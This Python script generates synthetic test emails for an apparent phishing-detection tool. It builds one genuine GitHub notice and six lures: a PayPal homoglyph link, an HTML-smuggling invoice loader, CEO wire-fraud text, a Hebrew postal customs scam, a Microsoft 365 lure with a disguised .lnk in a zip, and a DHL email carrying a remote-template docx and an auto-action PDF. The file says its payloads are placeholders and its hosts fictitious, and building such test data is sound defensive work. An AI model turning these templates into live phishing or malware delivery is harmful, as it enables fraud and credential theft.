"""Generate the sample emails in src/dayag/samples/.

The samples are synthetic and harmless: the "payloads" are placeholder text,
IP addresses come from documentation ranges (RFC 5737), and the attacker
domains are made up. They reproduce the *structure* of real phishing so every
detection can be demonstrated and tested.

    python scripts/make_samples.py
"""

from __future__ import annotations

import base64
import io
import struct
import zipfile
import zlib
from email import policy
from email.headerregistry import Address
from email.message import EmailMessage
from pathlib import Path

OUT = Path(__file__).resolve().parent.parent / "src" / "dayag" / "samples"
POLICY = policy.default.clone(max_line_length=100)


def new_message(headers: list[tuple[str, str | Address]]) -> EmailMessage:
    msg = EmailMessage(policy=POLICY)
    for name, value in headers:
        msg[name] = value
    return msg


def finish(msg: EmailMessage, name: str) -> None:
    for index, part in enumerate(msg.walk()):
        if part.is_multipart():
            part.set_boundary(f"==dayag-{name[:2]}-{index}==")
    path = OUT / name
    path.write_bytes(msg.as_bytes(policy=POLICY))
    print(f"wrote {path.relative_to(OUT.parent.parent.parent)}")


# 01: a legitimate GitHub notification -------------------------------------


def github_notification() -> None:
    msg = new_message(
        [
            (
                "Received",
                "from out-21.smtp.github.com (out-21.smtp.github.com [192.30.252.204]) "
                "by mx.google.com with ESMTPS id a1si123456qkb.401.2026.11.02.07.41.12 "
                "for <noa.levi@contoso.com>; Mon, 02 Nov 2026 07:41:12 -0800 (PST)",
            ),
            (
                "Authentication-Results",
                "mx.google.com; dkim=pass header.i=@github.com "
                "header.s=pf2023 header.b=Kx9f2a1Q; spf=pass (google.com: "
                "domain of noreply@github.com designates 192.30.252.204 as "
                "permitted sender) smtp.mailfrom=noreply@github.com; "
                "dmarc=pass (p=REJECT sp=REJECT dis=NONE) header.from=github.com",
            ),
            ("Return-Path", "<noreply@github.com>"),
            (
                "Received",
                "from github.com (hubbernetes-node-6c1d.ac4-iad.github.net [10.52.112.34]) "
                "by smtp.github.com (Postfix) with ESMTPA id 4R8kQ01xyz; "
                "Mon, 02 Nov 2026 07:41:11 -0800 (PST)",
            ),
            ("From", Address("Dana Cohen", "notifications", "github.com")),
            ("To", "harelhz/shomer <shomer@noreply.github.com>"),
            ("Cc", "Noa Levi <noa.levi@contoso.com>"),
            ("Subject", "Re: [harelhz/shomer] Add Hebrew translations for the popup (PR #14)"),
            ("Date", "Mon, 02 Nov 2026 07:41:11 -0800"),
            ("Message-ID", "<harelhz/shomer/pull/14/c2468013579@github.com>"),
            ("In-Reply-To", "<harelhz/shomer/pull/14@github.com>"),
            ("References", "<harelhz/shomer/pull/14@github.com>"),
            ("List-ID", "harelhz/shomer <shomer.harelhz.github.com>"),
            ("List-Unsubscribe", "<https://github.com/notifications/unsubscribe/AB12CD34>"),
        ]
    )
    text = (
        "@dana-cohen approved these changes.\n\n"
        "Looks good to me. The RTL layout works in the popup and the options page.\n\n"
        "--\nReply to this email directly, view it on GitHub:\n"
        "https://github.com/harelhz/shomer/pull/14#pullrequestreview-2468013579\n"
        "You are receiving this because you were mentioned.\n"
    )
    html = (
        "<html><body><p><b>@dana-cohen</b> approved these changes.</p>"
        "<p>Looks good to me. The RTL layout works in the popup and the options page.</p>"
        '<p style="font-size:small">&mdash;<br>Reply to this email directly, '
        '<a href="https://github.com/harelhz/shomer/pull/14#pullrequestreview-2468013579">'
        "view it on GitHub</a>, or "
        '<a href="https://github.com/notifications/unsubscribe-auth/AB12CD34">unsubscribe</a>.'
        "</p>"
        '<img src="https://github.com/notifications/beacon/AB12CD34.gif" height="1" width="1" '
        'alt=""></body></html>'
    )
    msg.set_content(text)
    msg.add_alternative(html, subtype="html")
    finish(msg, "01-github-notification.eml")


# 02: PayPal credential phish with a homoglyph link -------------------------


def paypal_homoglyph() -> None:
    homoglyph_host = "www.pаypal.com".encode("idna").decode()  # Cyrillic а (U+0430)
    msg = new_message(
        [
            (
                "Received",
                "from mail.paypal-resolution-center.com (mail.paypal-resolution-center.com "
                "[203.0.113.45]) by mx.google.com with ESMTPS id k7si99887766qtb.12.2026.10.30; "
                "Fri, 30 Oct 2026 03:12:09 -0700 (PDT)",
            ),
            (
                "Authentication-Results",
                "mx.google.com; dkim=pass "
                "header.i=@paypal-resolution-center.com header.s=mail; "
                "spf=pass (google.com: domain of "
                "service@paypal-resolution-center.com designates 203.0.113.45 "
                "as permitted sender) smtp.mailfrom=service@paypal-resolution-center.com; "
                "dmarc=pass (p=NONE sp=NONE dis=NONE) "
                "header.from=paypal-resolution-center.com",
            ),
            ("Return-Path", "<service@paypal-resolution-center.com>"),
            ("From", Address("PayPal", "service", "paypal-resolution-center.com")),
            ("To", "noa.levi@contoso.com"),
            ("Subject", "Your account has been limited - action required"),
            ("Date", "Fri, 30 Oct 2026 11:12:07 +0100"),
            ("Message-ID", "<20261030101207.4f2a@paypal-resolution-center.com>"),
        ]
    )
    text = (
        "Dear Customer,\n\n"
        "We noticed unusual activity on your PayPal account. As a precaution your account "
        "has been limited. To restore full access you must verify your identity within 24 "
        "hours, otherwise your account will be suspended.\n\n"
        "Verify now: https://www.paypal.com/signin\n\nPayPal Security Team\n"
    )
    html = (
        '<html><body style="font-family:Arial">'
        "<p>Dear Customer,</p>"
        "<p>We noticed <b>unusual activity</b> on your PayPal account. As a precaution your "
        "account has been limited. To restore full access you must verify your identity "
        "within 24 hours, otherwise your account will be suspended.</p>"
        f'<p><a href="https://{homoglyph_host}/signin?country.x=US&locale.x=en_US">'
        "https://www.paypal.com/signin</a></p>"
        "<p>PayPal Security Team</p></body></html>"
    )
    msg.set_content(text)
    msg.add_alternative(html, subtype="html")
    finish(msg, "02-paypal-homoglyph.eml")


# 03: fake invoice with an HTML smuggling attachment -------------------------


def html_smuggling_invoice() -> None:
    placeholder = base64.b64encode(b"Dayag sample: harmless placeholder, not a payload.\n").decode()
    smuggler = f"""<!DOCTYPE html>
<html><head><title>Invoice INV-20931</title></head>
<body>
<p>Loading your document, please wait...</p>
<script>
  // Classic HTML smuggling: decode embedded data, build a file, force a download.
  var data = "{placeholder}";
  var bytes = Uint8Array.from(atob(data), function (c) {{ return c.charCodeAt(0); }});
  var blob = new Blob([bytes], {{ type: "application/octet-stream" }});
  var a = document.createElement("a");
  a.href = URL.createObjectURL(blob);
  a.download = "INV-20931.iso";
  document.body.appendChild(a);
  a.click();
</script>
</body></html>
"""
    msg = new_message(
        [
            (
                "Received",
                "from mail-sor-f41.google.com (mail-sor-f41.google.com [209.85.220.41]) "
                "by mx.contoso.com with ESMTPS id 9f8e7d6c5b; Wed, 28 Oct 2026 09:30:41 +0200",
            ),
            (
                "Authentication-Results",
                "mx.contoso.com; dkim=pass header.d=gmail.com "
                "header.s=20230601; spf=pass smtp.mailfrom=gmail.com; "
                "dmarc=pass (p=NONE sp=QUARANTINE dis=NONE) header.from=gmail.com",
            ),
            ("Return-Path", "<ap.northwind.billing@gmail.com>"),
            (
                "Received",
                "by mail-sor-f41.google.com with SMTP id 2adb3069b0e04-5a1b2c3d4e; "
                "Wed, 28 Oct 2026 00:30:40 -0700 (PDT)",
            ),
            ("From", Address("Accounts Payable", "ap.northwind.billing", "gmail.com")),
            ("To", "finance@contoso.com"),
            ("Subject", "RE: Invoice INV-20931 overdue"),
            ("Date", "Wed, 28 Oct 2026 09:30:39 +0200"),
            ("Message-ID", "<CAH7x9Lq2w@mail.gmail.com>"),
        ]
    )
    msg.set_content(
        "Hello,\n\nAs discussed, please find attached the outstanding invoice INV-20931. "
        "The payment is overdue; please process the wire transfer today to avoid late fees.\n\n"
        "The invoice opens in your browser.\n\nRegards,\nAccounts Payable\n"
    )
    msg.add_attachment(
        smuggler.encode(), maintype="text", subtype="html", filename="INV-20931.pdf.html"
    )
    finish(msg, "03-html-smuggling-invoice.eml")


# 04: CEO fraud (business email compromise), no links or attachments --------


def ceo_fraud() -> None:
    msg = new_message(
        [
            (
                "Received",
                "from EUR05-AM6-obe.outbound.protection.outlook.com "
                "(mail-am6eur05olkn2101.outbound.protection.outlook.com [40.92.58.101]) "
                "by mx.google.com with ESMTPS id u3si55443322wrt.88.2026.11.01; "
                "Sun, 01 Nov 2026 06:02:51 -0800 (PST)",
            ),
            (
                "Authentication-Results",
                "mx.google.com; dkim=pass header.i=@outlook.com "
                "header.s=selector1; spf=pass (google.com: domain of "
                "yossi.mizrahi.ceo@outlook.com designates 40.92.58.101 as "
                "permitted sender) smtp.mailfrom=yossi.mizrahi.ceo@outlook.com; "
                "dmarc=pass (p=NONE sp=QUARANTINE dis=NONE) header.from=outlook.com",
            ),
            ("Return-Path", "<yossi.mizrahi.ceo@outlook.com>"),
            ("From", Address("Yossi Mizrahi", "yossi.mizrahi.ceo", "outlook.com")),
            ("Reply-To", Address("Yossi Mizrahi", "y.mizrahi.office", "gmail.com")),
            ("To", "noa.levi@contoso.com"),
            ("Subject", "Urgent request"),
            ("Date", "Sun, 01 Nov 2026 16:02:49 +0200"),
            ("Message-ID", "<AM6PR05MB1234ABCD@AM6PR05MB1234.eurprd05.prod.outlook.com>"),
            ("X-Originating-IP", "[198.51.100.188]"),
        ]
    )
    msg.set_content(
        "Hi Noa,\n\nAre you available? I need a quick favor.\n\n"
        "We are closing the acquisition today and I need you to process a wire transfer of "
        "$48,500 to our new vendor. I will send the bank details as soon as you confirm. "
        "Please keep this confidential until the deal is announced, and don't call me, I'm in "
        "meetings all day. Reply by email only.\n\nYossi\nSent from my iPhone\n"
    )
    finish(msg, "04-ceo-fraud.eml")


# 05: Israel Post customs-fee phish in Hebrew, sent from a hacked web server -


def israel_post_customs() -> None:
    msg = new_message(
        [
            (
                "Received",
                "from webserver01.example-hosting.top (unknown [198.51.100.23]) by "
                "AM4PEPF00027A6C.mail.protection.outlook.com (10.167.16.89) with Microsoft "
                "SMTP Server id 15.20.8093.14; Thu, 29 Oct 2026 18:44:02 +0000",
            ),
            (
                "Authentication-Results",
                "spf=softfail (sender IP is 198.51.100.23) "
                "smtp.mailfrom=israelpost-delivery.top; dkim=none (message not "
                "signed) header.d=none;dmarc=none action=none "
                "header.from=israelpost-delivery.top;compauth=fail reason=601",
            ),
            (
                "Received-SPF",
                "SoftFail (protection.outlook.com: domain of transitioning "
                "israelpost-delivery.top discourages use of 198.51.100.23 as permitted "
                "sender)",
            ),
            ("Return-Path", "<www-data@webserver01.example-hosting.top>"),
            (
                "Received",
                "by webserver01.example-hosting.top (Postfix, from userid 33) id 8C1F2A0; "
                "Thu, 29 Oct 2026 20:43:58 +0200 (IST)",
            ),
            ("From", Address("דואר ישראל", "noreply", "israelpost-delivery.top")),
            ("To", "noa.levi@contoso.com"),
            ("Subject", "החבילה שלך ממתינה - נדרש תשלום דמי מכס"),
            ("Date", "Thu, 29 Oct 2026 20:43:58 +0200"),
            ("Message-ID", "<8c1f2a0.4417@webserver01.example-hosting.top>"),
            ("X-Mailer", "PHPMailer 6.8.0 (https://github.com/PHPMailer/PHPMailer)"),
            ("X-PHP-Originating-Script", "1001:wp-content/uploads/2026/10/mailer.php"),
        ]
    )
    text = (
        "לקוח יקר,\n\n"
        "החבילה שלך מספר RR482913570IL מעוכבת במרכז המיון בשל דמי מכס שלא שולמו.\n"
        'יש להסדיר תשלום בסך 9.90 ש"ח תוך 24 שעות, אחרת החבילה תוחזר לשולח.\n\n'
        "למעקב: https://israelpost-delivery.top/track?id=RR482913570IL\n"
        "לתשלום: https://bit.ly/dayag-sample-il\n\n"
        "דואר ישראל\n"
    )
    html = (
        '<html dir="rtl"><body style="font-family:Arial">'
        "<p>לקוח יקר,</p>"
        "<p>החבילה שלך מספר <b>RR482913570IL</b> מעוכבת במרכז המיון בשל דמי מכס שלא שולמו.</p>"
        '<p>יש להסדיר תשלום בסך 9.90 ש"ח תוך 24 שעות, אחרת החבילה תוחזר לשולח.</p>'
        '<p><a href="http://198.51.100.23:8080/il/post/payment.php?id=RR482913570IL" '
        'style="background:#d40000;color:#fff;padding:10px 24px;border-radius:4px">'
        "לתשלום מאובטח</a></p>"
        '<p><a href="https://israelpost-delivery.top/track?id=RR482913570IL">מעקב משלוח</a></p>'
        "<p>דואר ישראל</p></body></html>"
    )
    msg.set_content(text)
    msg.add_alternative(html, subtype="html")
    finish(msg, "05-israel-post-customs.eml")


# 06: a Microsoft 365 phish, as reported by a user to the SOC ----------------


def _entry(name: str) -> zipfile.ZipInfo:
    """A zip entry with a fixed timestamp, so samples are byte-for-byte reproducible."""
    info = zipfile.ZipInfo(name, date_time=(2026, 10, 31, 9, 0, 0))
    info.compress_type = zipfile.ZIP_DEFLATED
    return info


def _encrypted_flag(data: bytes) -> bytes:
    """Set the 'encrypted' bit in every zip header. The content is not really
    encrypted (Python cannot write encrypted zips); detection reads the flag."""
    buffer = bytearray(data)
    for signature, offset in ((b"PK\x03\x04", 6), (b"PK\x01\x02", 8)):
        start = 0
        while (position := buffer.find(signature, start)) != -1:
            flags = struct.unpack_from("<H", buffer, position + offset)[0]
            struct.pack_into("<H", buffer, position + offset, flags | 0x1)
            start = position + 4
    return bytes(buffer)


def reported_m365_phish() -> None:
    archive = io.BytesIO()
    with zipfile.ZipFile(archive, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(
            _entry("Password_Policy_2026.pdf.lnk"), b"Dayag sample: harmless placeholder.\n"
        )
        zf.writestr(_entry("readme.txt"), b"Open the policy document to keep your password.\n")
    target = "https://m365-login-portal.web.app/auth?user=noa.levi%40contoso.com"
    from urllib.parse import quote

    safelink = (
        "https://eur03.safelinks.protection.outlook.com/?url="
        + quote(target, safe="")
        + "&data=05%7C02%7Cnoa.levi%40contoso.com%7C1a2b3c4d%7C0%7C0%7C638123456789"
        "&sdata=Zm9vYmFyYmF6cXV4&reserved=0"
    )
    inner = new_message(
        [
            (
                "Received",
                "from mail.micros0ft-security.com (203.0.113.77) by "
                "VI1PR04MB5678.eurprd04.prod.outlook.com with Microsoft SMTP Server; "
                "Mon, 02 Nov 2026 06:15:31 +0000",
            ),
            (
                "Authentication-Results",
                "spf=pass (sender IP is 203.0.113.77) "
                "smtp.mailfrom=micros0ft-security.com; dkim=pass (signature was "
                "verified) header.d=micros0ft-security.com;dmarc=pass "
                "action=none header.from=micros0ft-security.com;compauth=pass "
                "reason=100",
            ),
            ("From", Address("Microsoft 365", "no-reply", "micros0ft-security.com")),
            ("To", "noa.levi@contoso.com"),
            ("Subject", "Your Microsoft 365 password expires today"),
            ("Date", "Mon, 02 Nov 2026 06:15:29 +0000"),
            ("Message-ID", "<b7e1.20261102061529@micros0ft-security.com>"),
        ]
    )
    inner.set_content(
        "Your Microsoft 365 password expires today.\n\nKeep my current password: "
        + safelink
        + "\n\nThe new password policy is attached. The archive password is 2026.\n"
    )
    inner.add_alternative(
        "<html><body><h2>Microsoft 365</h2>"
        "<p>The password for noa.levi@contoso.com <b>expires today</b>.</p>"
        f'<p><a href="{safelink}">Keep my current password</a></p>'
        "<p>The new password policy is attached. The archive password is <b>2026</b>.</p>"
        "</body></html>",
        subtype="html",
    )
    inner.add_attachment(
        _encrypted_flag(archive.getvalue()),
        maintype="application",
        subtype="zip",
        filename="Password_Policy_2026.zip",
    )

    outer = new_message(
        [
            (
                "Received",
                "from VI1PR04MB9999.eurprd04.prod.outlook.com (10.20.30.40) by "
                "VI1PR04MB1111.eurprd04.prod.outlook.com with Microsoft SMTP Server; "
                "Mon, 02 Nov 2026 07:02:10 +0000",
            ),
            ("From", Address("Noa Levi", "noa.levi", "contoso.com")),
            ("To", "phishing@contoso.com"),
            ("Subject", "FW: Your Microsoft 365 password expires today"),
            ("Date", "Mon, 02 Nov 2026 07:02:08 +0000"),
            ("Message-ID", "<VI1PR04MB9999.report.7781@contoso.com>"),
        ]
    )
    outer.set_content("Hi SOC team, this looks suspicious. Reporting it as an attachment.\n\nNoa\n")
    outer.add_attachment(inner, filename="Your Microsoft 365 password expires today.eml")
    finish(outer, "06-reported-m365-phish.eml")


# 07: shipping documents with a remote template and an active PDF ----------


def _docx_with_remote_template() -> bytes:
    files = {
        "[Content_Types].xml": (
            '<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/'
            'package/2006/content-types"><Default Extension="rels" ContentType="application/'
            'vnd.openxmlformats-package.relationships+xml"/><Override PartName="/word/document.xml"'
            ' ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.'
            'document.main+xml"/></Types>'
        ),
        "word/document.xml": (
            '<?xml version="1.0" encoding="UTF-8"?><w:document xmlns:w="http://schemas.'
            'openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>Shipping '
            "documents (Dayag sample)</w:t></w:r></w:p></w:body></w:document>"
        ),
        "word/settings.xml": (
            '<?xml version="1.0" encoding="UTF-8"?><w:settings xmlns:w="http://schemas.'
            'openxmlformats.org/wordprocessingml/2006/main"><w:attachedTemplate r:id="rId1" '
            'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>'
            "</w:settings>"
        ),
        "word/_rels/settings.xml.rels": (
            '<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.'
            'openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" '
            'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/'
            'attachedTemplate" Target="http://198.51.100.77/templates/invoice.dotm" '
            'TargetMode="External"/></Relationships>'
        ),
    }
    archive = io.BytesIO()
    with zipfile.ZipFile(archive, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, content in files.items():
            zf.writestr(_entry(name), content)
    return archive.getvalue()


def _pdf_with_actions() -> bytes:
    hidden = zlib.compress(b"<< /S /URI /URI (https://dhl-express-billing.com/receipt/download) >>")
    return (
        b"%PDF-1.7\n"
        b"1 0 obj << /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >> endobj\n"
        b"2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj\n"
        b"3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Annots [5 0 R] >> endobj\n"
        b"4 0 obj << /S /JavaScript /JS (app.alert\\('Dayag sample'\\);) >> endobj\n"
        b"5 0 obj << /Type /Annot /Subtype /Link /Rect [72 600 300 620] "
        b"/A << /S /URI /URI (http://dhl-express-billing.com/receipt/view?id=88231) >> >> endobj\n"
        b"6 0 obj << /Length "
        + str(len(hidden)).encode()
        + b" /Filter /FlateDecode >>\nstream\n"
        + hidden
        + b"\nendstream\nendobj\n"
        b"trailer << /Root 1 0 R >>\n%%EOF\n"
    )


def shipping_documents() -> None:
    msg = new_message(
        [
            (
                "Received",
                "from mail.dhl-express-billing.com (mail.dhl-express-billing.com "
                "[203.0.113.120]) by mx.contoso.com with ESMTP id 77aa66bb; "
                "Sat, 31 Oct 2026 10:05:12 +0200",
            ),
            (
                "Authentication-Results",
                "mx.contoso.com; spf=fail smtp.mailfrom=dhl-express-billing.com; "
                "dkim=none; dmarc=fail (p=QUARANTINE) "
                "header.from=dhl-express-billing.com",
            ),
            (
                "Authentication-Results",
                "mail.dhl-express-billing.com; spf=pass "
                "smtp.mailfrom=dhl-express-billing.com; dkim=pass "
                "header.d=dhl-express-billing.com; dmarc=pass "
                "header.from=dhl-express-billing.com",
            ),
            ("From", Address("DHL Express", "billing", "dhl-express-billing.com")),
            ("To", "logistics@contoso.com"),
            ("Subject", "DHL shipment 4410293857: documents and receipt"),
            ("Date", "Sat, 31 Oct 2026 10:05:10 +0200"),
            ("Message-ID", "<4410293857.20261031@dhl-express-billing.com>"),
        ]
    )
    msg.set_content(
        "Dear customer,\n\nYour shipment 4410293857 is on hold. Please review the attached "
        "shipping documents and receipt, and pay the outstanding customs fee to release it.\n\n"
        "DHL Express Billing\n"
    )
    msg.add_attachment(
        _docx_with_remote_template(),
        maintype="application",
        subtype="vnd.openxmlformats-officedocument.wordprocessingml.document",
        filename="DHL_Shipping_Documents.docx",
    )
    msg.add_attachment(
        _pdf_with_actions(),
        maintype="application",
        subtype="pdf",
        filename="DHL_Receipt_4410293857.pdf",
    )
    finish(msg, "07-dhl-shipping-documents.eml")


if __name__ == "__main__":
    OUT.mkdir(parents=True, exist_ok=True)
    github_notification()
    paypal_homoglyph()
    html_smuggling_invoice()
    ceo_fraud()
    israel_post_customs()
    reported_m365_phish()
    shipping_documents()
